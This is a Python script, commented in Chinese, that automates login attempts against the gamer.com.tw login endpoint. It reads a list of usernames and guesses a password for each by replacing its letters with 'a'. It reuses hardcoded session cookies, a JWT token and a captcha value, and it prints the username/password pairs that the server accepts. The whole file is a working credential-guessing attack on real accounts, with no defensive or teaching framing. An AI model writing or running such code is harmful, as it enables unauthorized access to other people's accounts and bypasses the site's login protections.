import requests
import re  # 引入正則表達式模組
# 讀取用戶名列表
with open("bbb.txt", "r", encoding="utf-8") as file:
    usernames = [line.strip() for line in file if line.strip()]

# Cookies 設定
cookies = {
    "_ga": "GA1.1.1957928680.1732967366",
    "ckM": "2531167198",
    "buap_modr": "p014",
    "buap_puoo": "p301",
    "__cf_bm": "8g081AxaWSMBisaIQ8kVaj12D13YrYRkgkmbvOVqu8o-1734458024-1.0.1.1-1jhq8etqddm1zfwB6Kdik3sTpOaQAeztpckT21uG4OADx.UR62RnCch35GUpjBvQYO8EnAjvJPnpcTooC43rbg",
    "nowtoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJqaWQiOiJoZXk4NzEyMDhAbGl0ZS5nYW1lci5jb20udHciLCJleHAiOjE3MzQ0NTcxODksIm5vbmNlIjoxODY2Njc1NzE1LCJkZW55UG9zdCI6ZmFsc2UsIm1vYmlsZVZlcmlmeSI6dHJ1ZX0.NRWiviWxyOEFw_mBRyQ4F-F5lNlTfeW3Fvq7gJzyxbkBOqLtByIbSmhusZQkDiTpSd4i2DuHNQpehV3ja4mBWw",
    # 添加其他需要的 cookies
}

# Headers 設定
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "zh-TW,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7",
    "Cache-Control": "no-cache",
    "Origin": "https://user.gamer.com.tw",
    "Pragma": "no-cache",
    "Referer": "https://user.gamer.com.tw/login.php",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary0qQXlZNngN0LmNYP"
}

# URL
url = "https://user.gamer.com.tw/ajax/do_login.php"

# 遍歷用戶名列表並發送請求
for i in usernames:
    # 替換所有字母為 'a'
    b = re.sub(r'[a-zA-Z]', 'a', i)

    body = f"""



    
------WebKitFormBoundary0qQXlZNngN0LmNYP
Content-Disposition: form-data; name="userid"

{i}
------WebKitFormBoundary0qQXlZNngN0LmNYP
Content-Disposition: form-data; name="password"

{b}
------WebKitFormBoundary0qQXlZNngN0LmNYP
Content-Disposition: form-data; name="autoLogin"

T
------WebKitFormBoundary0qQXlZNngN0LmNYP
Content-Disposition: form-data; name="alternativeCaptcha"

04fe2e10c914ba99fcdc95d6d8528c0163c806f914157233676303f7
------WebKitFormBoundary0qQXlZNngN0LmNYP
Content-Disposition: form-data; name="twoStepAuth"


------WebKitFormBoundary0qQXlZNngN0LmNYP--
"""

    # 發送請求
    response = requests.post(url, headers=headers, cookies=cookies, data=body.encode("utf-8"))

    # 過濾特定的錯誤回應
    if '"error"' not in response.text:
        # 檢查返回結果是否包含 "data": {"status": 1}，如果是則打印
        print(f"Username: {i}, Password: {b}, Status Code: {response.status_code}")
        print("Response:", response.text)



    if '"CSRF_TOKEN_ERROR"' in response.text:
        print(f"Username: {i}, Password: {b}, Status Code: {response.status_code}")
        print("Response:", response.text)
    else:
        c=1
